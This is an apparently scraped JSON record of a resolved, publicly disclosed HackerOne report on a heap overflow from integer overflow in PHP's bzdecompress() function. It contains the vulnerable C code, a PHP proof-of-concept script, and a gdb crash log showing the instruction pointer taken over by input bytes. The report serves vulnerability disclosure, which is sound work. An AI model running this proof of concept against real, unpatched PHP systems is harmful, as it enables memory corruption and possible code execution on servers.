{
  "id": 180563,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xODA1NjM=",
  "url": "https://hackerone.com/reports/180563",
  "title": "Heap overflow due to integer overflow in bzdecompress() function",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2016-11-07T02:05:13.928Z",
  "submitted_at": "2016-11-07T02:05:13.928Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "fosec",
    "url": "/fosec",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/117/661/fea0d61725bc84364bc634a31409aa6c8c43ca03_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 54349,
    "url": "https://hackerone.com/ibb",
    "handle": "ibb",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T134340Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=363f204dda29e75e1198e60ff2fc85759087cc8857389085a7ad4554f3a39630",
      "medium": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/v0qywgoh5hm4cbhuanu8mqdtowhr/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c?response-content-disposition=inline%3B%20filename%3D%22ibb%20revision%205%20copy.png%22%3B%20filename%2A%3DUTF-8%27%27ibb%2520revision%25205%2520copy.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQTTMJ4VL%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T134340Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEIv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQCyFQFT04wZrDhzCVQhTIePvQ5xBEB1KfjuULZnnuW68gIhAMmsmF6b6dEQT07rctw%2BtTCMDbA0zl6QGdT9HNXhQ12dKrIFCBQQAxoMMDEzNjE5Mjc0ODQ5Igw%2BJKoTAqPOS8l%2FZ0kqjwVSrZx1LH2VIgx4yRTONTSFfE%2Bz44kCcpmaLgcpxvx%2BWS48cziuoW2yiDQuDFciJg0BiHCWKTTJbWkbI4%2FBgCLDVMEDaFIp3uQnrp9npik2cpJqFqWO%2FvKSCaH4ffXh3ENu0omU4AHIwsgvMELa26FvTdNSWERJSc%2FkGuB%2FIcm5uWZG%2FG9OvPA1MnvMAmYgpf1zcPKulpneHMl8Oz5S9IlGk3F0Us%2FrbfRKwVm7KO%2FCCsRbCqzd6lVPVynAfGqK1ATMbE294Ot%2BDFnMoR5SnHh6qAEHC0lmgmUhYg%2B8ZLSO%2F3sZcekIhbac7gVN5M4mIQnCIZiCv%2Bz9QZ4GG8IUS%2FEgS4%2BcGGbOXvzW%2Bx2jZXsFnbFNyFmS3%2FP1uibP1S0vgnyc0HSvC3VJbjW5e4bZvjML5mw%2Bfb7HxRtxaq0IjhFBxQCEWhIZRgYXLIgHHruox6M%2BQpSGNWcXnD4zCNL89V84mWvBMTDvpEySLcbdS%2FO1sCZrL0DpyGsnCttSWHrrBjV%2FttHGxh0m0OLn8%2Fet%2BYctd332ls8umYj4UZ3LIrnrT2ifdi14VZFB48TE8esvLpjbfu%2FC%2BKKrxE7ixfYVurNGpmNBf5S3k0KU8ra9bRnlBOp2ECWVTr5VYmH7S60gkSwR17zoGkU1rxwZidW4cfLhMri4%2BgUdflmxc2qr1oAKNmC01abFbyEjtk5tDmRUzv5GZHlx5P0Ms0R8yORUpE9l3RcVKesy8GM0%2FreKM6UidHqCQX8onF2M%2BrSdYKUPXuin1C9BheQG6WuCHJs0a3JR8sd2CI3ZrgCSCq6DVWhUG3Y2JvqbKvtrpJTmNKstYsgCSbp61A8BHLhQ8i6Dk0IenFmkCaZD7D5BlnVSXo7LMO24v8YGOrABpQPnpP70Y8Z2RBWKtzxGvTj89XOJf0k1xT1Z%2B%2BqY6CQd2jdSge%2FSbo9G0Y%2ByE3dswSuY3hbwmaqeFeaicxJaR%2BnvTd6IEq3bO5w0YhSVIVSL4wNw5Cy5zPxi8%2B%2BW5Pw0g37jJkNfiw1vKjT1P066K5JbRKO%2FgIUjX%2FObfX5yvc2cnHaJFQS5UC8ep%2FakAxjxtCY5AGFst5kZYbkD0wPhorUOVmjw2ZBA1lwOqf%2BWpys%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=829b07372b85e1e09fc56d958d454c984d3bb43959a825d6dfeb37df1270ade0"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Internet Bug Bounty",
      "twitter_handle": "",
      "website": "https://www.hackerone.com/internet-bug-bounty",
      "about": "The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-11-12T09:21:52.975Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2019-10-13T09:21:44.397Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "The fix for this bug has been committed: https://bugs.php.net/bug.php?id=73386\nDescription:\n------------\nI have found some vulnerable code at ```bzdecompress()``` function in module Bzip2. ```bzdecompress() function``` creates a new zend_string object to store decompressed data. The size of destination string depends on the size of source string. ( refer at ```ext/bz2/bz2.c:589``` )\n\n``` c\nstatic PHP_FUNCTION(bzdecompress)\n{\n....\n\tbzs.avail_in = source_len;\n\t/* in most cases bz2 offers at least 2:1 compression, so we use that as our base */\n\tbzs.avail_out = source_len * 2;\n\tdest = zend_string_alloc(bzs.avail_out + 1, 0);\n....\n}\n```\n\nIf compressed string is too long, ```bzs.avail_out``` will be an unexpected value and ```zend_string_alloc()``` function will allocate a small memory range. Due to missing check of size before calling\n```zend_string_alloc()```, this new memory range can not use to store large decompressed data and lead to heap overflow. The overflow results as arbitrary code execution, I can control eip register to the arbitrary value. This bug is only triggered in 32bit machine.\n\nTest script:\n---------------\n``` php\n<?php\nini_set('memory_limit', -1);\n$s = str_repeat('A', 0xE3AC).\"BBBB\".str_repeat('C', 0x1C50);\n$a = bzcompress($s);\n$a = $a.str_repeat('A', 4634 - strlen($a));\n$a = str_repeat($a, 0x7ffffffe / strlen($a)); // try to create a compressed data with large size\nbzdecompress($a); // trigger this vulnerability\n?>\n```\nActual result:\n--------------\n```\n[root@local PHP-7.1]# gdb --args sapi/cli/php -f ../crash/bz_poc.php\n\n[----------------------------------registers-----------------------------------]\nEAX: 0x0\nEBX: 0x1\nECX: 0xffffff60\nEDX: 0x7fff\nESI: 0xb7813020 --> 0xb78743f0 ('A' <repeats 28 times>, \"BBBB\", 'C' <repeats 168 times>...)\nEDI: 0xb787440c (\"BBBB\", 'C' <repeats 196 times>...)\nEBP: 0xbfffc094 --> 0x0\nESP: 0xbfffbffc --> 0x835fd02 (<execute_ex+34>: test   edi,edi)\nEIP: 0x42424242 --> 0x2478184\nEFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n=> 0x42424242:  test   BYTE PTR [ecx+0x60380247],al\n   0x42424248:  inc    ecx\n   0x42424249:  inc    ecx\n   0x4242424a:  inc    ecx\n[------------------------------------stack-------------------------------------]\n0000| 0xbfffbffc --> 0x835fd02 (<execute_ex+34>:        test   edi,edi)\n0004| 0xbfffc000 --> 0xbfffc094 --> 0x0\n0008| 0xbfffc004 --> 0xb7864180 --> 0x2\n0012| 0xbfffc008 --> 0x0\n0016| 0xbfffc00c --> 0x83aed9b (<zend_execute+315>:     mov    edx,DWORD PTR [esp+0x18])\n0020| 0xbfffc010 --> 0xb7813020 --> 0xb78743f0 ('A' <repeats 28 times>, \"BBBB\", 'C' <repeats 168 times>...)\n0024| 0xbfffc014 --> 0x0\n0028| 0xbfffc018 --> 0x1c\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x42424242 in ?? ()\ngdb-peda$ i r eip\neip            0x42424242       0x42424242\ngdb-peda$\n```\nEIP is controlled as **0x42424242**, from the input **\"BBBB\"**.",
  "weakness": {
    "id": 2,
    "name": "Memory Corruption - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2019-11-12T09:21:44.460Z",
  "allow_singular_disclosure_after": -184911716.46832117,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "spetr0x"
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 84120,
    "asset_type": "OTHER",
    "asset_identifier": "PHP",
    "max_severity": "none"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
